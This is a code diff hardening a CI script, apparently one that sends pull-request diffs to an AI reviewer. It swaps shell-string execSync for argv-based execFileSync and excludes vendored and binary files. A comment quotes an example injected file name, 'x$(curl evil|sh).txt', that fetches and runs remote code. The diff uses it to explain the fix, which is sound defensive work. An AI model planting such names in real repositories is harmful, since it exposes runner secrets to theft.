@@ -9,7 +9,7 @@
 // once it's set as a required status check (see AI_REVIEW.md — that part
 // can't be done from a workflow file, it's a repo settings change).
 
-import { execSync } from 'node:child_process';
+import { execFileSync } from 'node:child_process';
 
 const {
   ANTHROPIC_API_KEY,
@@ -40,19 +40,38 @@ const MAX_TOTAL_CONTEXT_CHARS = 300_000; // across all included full files combi
 //    a changed line lives in).
 // ---------------------------------------------------------------------
 
-function sh(cmd) {
-  return execSync(cmd, { maxBuffer: 1024 * 1024 * 50 }).toString();
+// argv-based, never a shell string: changed FILE NAMES come from the PR
+// author, and a name like  x$(curl evil|sh).txt  interpolated into an
+// execSync() command line would run as shell code on a runner that holds
+// ANTHROPIC_API_KEY and a pull-requests:write GITHUB_TOKEN. execFileSync
+// passes each argument straight to git with no shell in between.
+function git(...args) {
+  return execFileSync('git', args, { maxBuffer: 1024 * 1024 * 50 }).toString();
 }
 
-const changedFiles = sh(`git diff --name-only ${BASE_SHA} ${HEAD_SHA}`)
-  .split('\n').map((s) => s.trim()).filter(Boolean);
+// Never worth reviewing (or paying tokens for): vendored/minified third-party
+// bundles, hand-delivered .patch files, and binary media. Without this, one
+// bump of Public/Vendor/*.js or a stray .patch file eats the whole diff
+// budget below and the code that actually changed gets truncated away.
+const EXCLUDE_PATHSPECS = [
+  ':(exclude)Public/Vendor/**',
+  ':(exclude)*.patch',
+  ':(exclude)*.wav',
+  ':(exclude)*.zip',
+];
+
+// -z: NUL-separated, unquoted names — without it git C-quotes any path with
+// non-ASCII or special characters, and the later `git show <sha>:<name>`
+// then fails silently for exactly those files.
+const changedFiles = git('diff', '--name-only', '-z', BASE_SHA, HEAD_SHA, '--', '.', ...EXCLUDE_PATHSPECS)
+  .split('\0').filter(Boolean);
 
 if (!changedFiles.length) {
-  console.log('No changed files — nothing to review.');
+  console.log('No reviewable changed files — nothing to review.');
   process.exit(0);
 }
 
-let diff = sh(`git diff ${BASE_SHA} ${HEAD_SHA}`);
+let diff = git('diff', BASE_SHA, HEAD_SHA, '--', '.', ...EXCLUDE_PATHSPECS);
 let diffTruncated = false;
 if (diff.length > MAX_DIFF_CHARS) {
   diff = diff.slice(0, MAX_DIFF_CHARS);
@@ -66,7 +85,7 @@ for (const file of changedFiles) {
   if (budget <= 0) { contextTruncated = true; break; }
   let content;
   try {
-    content = sh(`git show ${HEAD_SHA}:"${file}"`);
+    content = git('show', `${HEAD_SHA}:${file}`);
   } catch {
     continue; // deleted, binary, or otherwise unreadable — the diff hunk alone is fine for these
   }
